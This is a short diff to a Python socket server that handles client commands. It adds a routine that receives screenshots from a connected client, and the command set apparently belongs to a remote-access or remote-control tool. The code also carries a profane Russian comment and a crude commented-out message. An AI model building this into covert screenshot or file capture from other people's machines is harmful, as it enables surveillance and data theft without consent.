@@ -82,9 +82,8 @@ def client_thread(connection, ip, port, max_buffer_size = 5120):
             elif("scr" in client_input):
                 with block_thread:
                     connection.sendall('scr'.encode('utf-8'))
-                    '''
-                        here will be screenshot saver 
-                    '''
+                    fname = connection.recv(1024).decode('utf-8')
+                    load_scr(fname, connection)
                     block_thread.notify_all()
             elif("ls" in client_input):
                 #здесь надо стопать главный тред а то уебищный вывод
@@ -106,17 +105,31 @@ def client_thread(connection, ip, port, max_buffer_size = 5120):
             
 
 
-        
-
-def load_file(fn,c):
+def load_scr(fn,c):
     print("Receiving...")
     #l = c.recv(1024)
-    f = open(fn,'wb')
+    f = open(fn,'wb+')
     l = c.recv(1024)
     while (l):
         print("Receiving...")
         f.write(l)
         l = c.recv(1024)
+        
+    f.close()
+    print("Done Receiving")
+    #c.send(b'Thank you for sending nudes')
+    c.close()
+
+def load_file(fn,c):
+    print("Receiving...")
+    #l = c.recv(1024)
+    f = open(fn,'wb+')
+    l = c.recv(1024)
+    while (l):
+        print("Receiving...")
+        f.write(l)
+        l = c.recv(1024)
+        
     f.close()
     print("Done Receiving")
     #c.send(b'Thank you for sending nudes')
